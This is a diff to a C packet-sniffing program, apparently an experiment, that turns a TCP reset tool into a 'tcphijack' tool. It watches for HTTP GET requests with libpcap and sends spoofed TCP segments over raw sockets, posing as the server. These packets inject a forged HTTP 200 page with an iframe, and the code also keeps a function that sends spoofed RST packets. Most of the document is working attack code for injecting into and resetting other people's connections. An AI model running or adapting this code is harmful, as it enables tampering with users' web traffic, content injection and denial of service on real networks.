@@ -17,6 +17,7 @@
 #include <stdlib.h>       /* Standard library definitions  */ 
 #include <errno.h>
 #include <glib.h>
+#include <arpa/inet.h>
 
 #define TCPSYN_LEN 20
 #define MAXBYTES2CAPTURE 2048
@@ -40,7 +41,9 @@ typedef unsigned long u_int32;
 int TCP_RST_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_int16 dst_prt);
 unsigned short in_cksum(unsigned short *addr,int len);
 /* Function Prototypes */
-int Fake_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_int16 dst_prt);
+//具体的分析见5step.md       
+//Fake_send(包的seq,包的ack，包的内容,包的标志位,包的源地址,包的目的地址，包的源端口，包的目的端口)
+int Fake_send(u_int32 seq,u_int32 ack,char * content,u_char flag,u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_int16 dst_prt);
 /* Ethernet addresses are 6 bytes */
 #define ETHER_ADDR_LEN	6
 
@@ -101,17 +104,14 @@ int Fake_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_in
 /* using TCP RST packets.                                                      */
 int main(int argc, char *argv[] ){
  
- int count=0;
  bpf_u_int32 netaddr=0, mask=0;    /* To Store network address and netmask   */ 
  struct bpf_program filter;        /* Place to store the BPF filter program  */ 
  char errbuf[PCAP_ERRBUF_SIZE];    /* Error buffer                           */ 
  pcap_t *descr = NULL;             /* Network interface handler              */ 
  struct pcap_pkthdr pkthdr;        /* Packet information (timestamp,size...) */ 
  const unsigned char *packet=NULL; /* Received raw data                      */ 
- struct ip *iphdr = NULL;          /* IPv4 Header                            */
- struct tcphdr *tcphdr = NULL;     /* TCP Header                             */
  memset(errbuf,0,PCAP_ERRBUF_SIZE);
- int dst_port;
+// int dst_port;
 
 /* ethernet headers are always exactly 14 bytes */
 #define SIZE_ETHERNET 14
@@ -120,21 +120,27 @@ const struct sniff_ethernet *ethernet; /* The ethernet header */
 const struct sniff_ip *ip; /* The IP header */
 const struct sniff_tcp *tcp; /* The TCP header */
 
+char *html_content=NULL;
+u_int32 request_seqPlusLength=0;
+
 
 char *payload; /* Packet payload */
 const char *payload_METHOD="GET / HTTP";
 char payload_METHOD_buffer[10];
 
-const char *HOST="audits.wukong.com";
-char HOST_buffer[100];
+//const char *HOST="audits.wukong.com";
+//char HOST_buffer[100];
 
-int i,cmp1,cmp2;
+int i,cmp1;
+int segmentSize;
+u_int32 first_seq,secound_seq,third_seq;
+
 
 u_int size_ip;
 u_int size_tcp;
    
 if (argc != 2){
-	fprintf(stderr, "USAGE: tcpsyndos <interface>\n");
+	fprintf(stderr, "USAGE: tcphijack <interface>\n");
 	exit(1);
 }
 
@@ -169,23 +175,26 @@ while(1){
  /* Get one packet */
  if ( (packet = pcap_next(descr,&pkthdr)) != NULL){
 
+   //这里要注意结构体里有两个长度值
+   //http://stackoverflow.com/questions/1491660/pcap-struct-pcap-pkthdr-len-vs-caplen
+  segmentSize=pkthdr.caplen;
 
 	ethernet = (struct sniff_ethernet*)(packet);
 	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
 	size_ip = IP_HL(ip)*4;
 	if (size_ip < 20) {
 		printf("   * Invalid IP header length: %u bytes\n", size_ip);
-		return;
+		return 0;
 	}
 	tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
 	size_tcp = TH_OFF(tcp)*4;
 	if (size_tcp < 20) {
 		printf("   * Invalid TCP header length: %u bytes\n", size_tcp);
-		return;
+		return 0;
 	}
 
 
-	payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
+	payload = (char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
 
   	//GET / HTTP
  	for(i=0;i<10;i++){
@@ -206,12 +215,32 @@ while(1){
       //pretend be server,and send RST to source client fack server
       printf("得到一个GET请求，将得到请求的ack序号，放到发送的假包的seq里即可应答成功\n");
       printf("tcpdump的时候记得加上绝对号，-S输出\n");
+      printf("   SRC: %s\n",inet_ntoa(ip->ip_src));
+      printf("   DST: %s\n",inet_ntoa(ip->ip_dst));
       printf("   ACK: %u\n", g_ntohl(tcp->th_ack) );
       printf("   SEQ: %u\n", g_ntohl(tcp->th_seq) );
       printf("   SRC PORT: %d\n", ntohs(tcp->th_sport) );
       printf("   DST PORT: %d\n", ntohs(tcp->th_dport) );
 
-      Fake_send(tcp->th_ack, ip->ip_dst.s_addr, ip->ip_src.s_addr, tcp->th_dport, tcp->th_sport);
+      //假包的seq=th_ack，ack=seq+packect.length大小...
+      //这么构建似乎也有问题
+      //看来得发三次包：第一次空,ACK，第二次内容，PUSH+ACK，第三次，ACK？
+      //有待实验
+      printf("seq+segmentSize:%u,%u\n",g_ntohl(tcp->th_seq),segmentSize);
+      
+      //具体的分析见5step.md
+      //Fake_send(包的seq,包的ack，包的内容,包的标志位，包的源地址,包的目的地址，包的源端口，包的目的端口)
+      request_seqPlusLength=g_htonl(g_ntohl(tcp->th_seq)+355);
+      
+      html_content="HTTP/1.1 200 OK\r\nServer: nginx\r\nDate: Tue, 29 Jan 2013 04:42:24 GMT\r\nContent-Type: text/html\r\nContent-Length:5946\r\nLast-Modified: Tue, 29 Jan 2013 04:42:01 GMT\r\nConnection: keep-alive\r\nAccept-Ranges: bytes\r\n\r\n<html><head><meta http-equiv='pragma' content='no-cache'><meta http-equiv='cache-control' content='no-cache,must-revalidate'></head><body><h1>hhhhhhhhhhhh</h1><iframe width='1000' border='0' height='700' src='http://www.baidu.com/'></iframe></body></html>\n";     
+
+     first_seq   = tcp->th_ack;
+     secound_seq = g_htonl(g_ntohl(tcp->th_ack)+0);
+     third_seq   = g_htonl(g_ntohl(secound_seq)+466);
+
+Fake_send(first_seq   ,request_seqPlusLength,""          ,TH_ACK          ,ip->ip_dst.s_addr,ip->ip_src.s_addr,tcp->th_dport,tcp->th_sport);
+Fake_send(secound_seq ,request_seqPlusLength,html_content,TH_ACK|TH_PUSH  ,ip->ip_dst.s_addr,ip->ip_src.s_addr,tcp->th_dport,tcp->th_sport);
+Fake_send(third_seq   ,request_seqPlusLength,""          ,TH_ACK|TH_FIN   ,ip->ip_dst.s_addr,ip->ip_src.s_addr,tcp->th_dport,tcp->th_sport);
       //preten be client, and sent RST to server....fack client
       //TCP_RST_send(htonl(ntohl(tcp->th_seq)+1), ip->ip_src.s_addr, ip->ip_dst.s_addr, tcp->th_sport, tcp->th_dport);
       printf("\n+-------------------------+\n");
@@ -246,11 +275,12 @@ while(1){
 return 0;
 
 }
+//具体的分析见5step.md
+//Fake_send(包的seq,包的ack，包的内容,包的标志位,包的源地址,包的目的地址，包的源端口，包的目的端口)
+int Fake_send(u_int32 seq,u_int32 ack,char * content,u_char flag,u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_int16 dst_prt)
+{
 
-//SEND FAKE TCP
-int Fake_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_int16 dst_prt){
-
-  static int i=0;
+  //static int i=0;
   //属于魔法值，要注意
   int one=1; /* R.Stevens says we need this variable for the setsockopt call */ 
 
@@ -258,14 +288,12 @@ int Fake_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_in
   int rawsocket=0; 
   int j=0;
 
-    //实际上这里需要变化的参数就只有src里面的host地址，以及所谓的Content—Length
-  char *html_content="HTTP/1.1 200 OK\r\nServer: nginx\r\nDate: Tue, 29 Jan 2013 04:42:24 GMT\r\nContent-Type: text/html\r\nContent-Length:5946\r\nLast-Modified: Tue, 29 Jan 2013 04:42:01 GMT\r\nConnection: keep-alive\r\nAccept-Ranges: bytes\r\n\r\n<html><head><meta http-equiv='pragma' content='no-cache'><meta http-equiv='cache-control' content='no-cache,must-revalidate'></head><body><h1>hhhhhhhhhhhh</h1><iframe width='1000' border='0' height='700' src='http://info.wukong.com/'></iframe></body></html>\n"; 
-  
-  int payload_len=strlen(html_content);
+  int payload_len=strlen(content);
+  printf("payload_len:%d\n",payload_len);
 
   /* Buffer for the TCP/IP SYN Packets */
   //需要构造的包
-  char packet[ sizeof(struct tcphdr) + sizeof(struct ip) + payload_len + 1 ];   
+  char packet[ sizeof(struct tcphdr) + sizeof(struct ip) + payload_len ];   
 
   int payload_offset=sizeof(struct tcphdr)+sizeof(struct ip);
 
@@ -292,7 +320,8 @@ int Fake_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_in
   /* on it, the sendto() system call requires the sockaddr_in structure */
   //用0大量填充内存
   struct sockaddr_in dstaddr; 
-  
+ 
+  printf("!!!!!!!ack.....:%u\n",g_ntohl(ack));
   memset(&pseudohdr,0,sizeof(tcp_phdr_t));
   memset(&packet, 0, sizeof(packet));
   memset(&dstaddr, 0, sizeof(dstaddr));   
@@ -336,10 +365,10 @@ int Fake_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_in
   /* TCP Header */
   /*这里的应答包构建时的seq号，必须是得到GET /请求的ack号（期望号）另外tcpdump观察包是否正确时，记得加上-S选项*/
   tcpheader->th_seq = seq;        /* Sequence Number                         */
-  tcpheader->th_ack = g_htonl(1);   /* Acknowledgement Number                  */
+  tcpheader->th_ack = ack;   /* Acknowledgement Number                  */
   tcpheader->th_x2 = 0;           /* Variable in 4 byte blocks. (Deprecated) */
   tcpheader->th_off = 5;      /* Segment offset (Lenght of the header)   */
-  tcpheader->th_flags = TH_ACK;   /* 原来这里设置成了RST，我们不能这么干        */
+  tcpheader->th_flags = flag;   /* 原来这里设置成了RST，我们不能这么干        */
   tcpheader->th_win = g_htons(4500) + rand()%1000;/* Window size               */
   tcpheader->th_urp = 0;          /* Urgent pointer.                         */
   tcpheader->th_sport = src_prt;  /* Source Port                             */
@@ -379,7 +408,7 @@ int Fake_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_in
   //copy the payload_content to packet;
   //
   for(j=payload_offset;j<payload_offset+payload_len;j++){
-      packet[j]=html_content[j-payload_offset];
+      packet[j]=content[j-payload_offset];
   }
 
   //printf("Html contetent %s\n",html_content);
@@ -393,9 +422,9 @@ int Fake_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_in
       return -1;
     }
 
-  printf("Sent RST Packet:\n");
-  printf("   SRC: %d \n", ipheader->ip_src);
-  printf("   DST: %d \n", ipheader->ip_dst);
+  printf("发送假包:\n");
+  printf("   SRC: %s \n", inet_ntoa(ipheader->ip_src));
+  printf("   DST: %s \n", inet_ntoa(ipheader->ip_dst));
   printf("   Seq=%u\n", g_ntohl(tcpheader->th_seq));
   printf("   Ack=%u\n", g_ntohl(tcpheader->th_ack));
   printf("   TCPsum: %02x\n",  tcpheader->th_sum);
@@ -413,7 +442,7 @@ return 0;
 /* values and sends the packet through a raw socket.                            */
 int TCP_RST_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u_int16 dst_prt){
 
-  static int i=0;
+  //static int i=0;
   int one=1; /* R.Stevens says we need this variable for the setsockopt call */ 
 
   /* Raw socket file descriptor */ 
@@ -509,17 +538,15 @@ int TCP_RST_send(u_int32 seq, u_int32 src_ip, u_int32 dst_ip, u_int16 src_prt, u
   //sendto(int socket, const void *buffer, size_t length, 
   //       int flags,const struct sockaddr *dest_addr, socklen_t dest_len);
   //
-  printf("size_t length:%d",ntohs(ipheader->ip_len));
+  printf("size_t length:%d\n",ntohs(ipheader->ip_len));
   /* Send it through the raw socket */    
   if ( sendto(rawsocket, packet, ntohs(ipheader->ip_len), 0,(struct sockaddr *) &dstaddr, sizeof (dstaddr)) < 0){		
         return -1;                     
     }
 
   printf("Sent RST Packet:\n");
-  printf("   SRC: %d \n", ipheader->ip_src);
-  printf("   DST: %d \n", ipheader->ip_dst);
   printf("   Seq=%u\n", ntohl(tcpheader->th_seq));
-  printf("   Ack=%d\n", ntohl(tcpheader->th_ack));
+  printf("   Ack=%u\n", ntohl(tcpheader->th_ack));
   printf("   TCPsum: %02x\n",  tcpheader->th_sum);
   printf("   IPsum: %02x\n", ipheader->ip_sum);
     
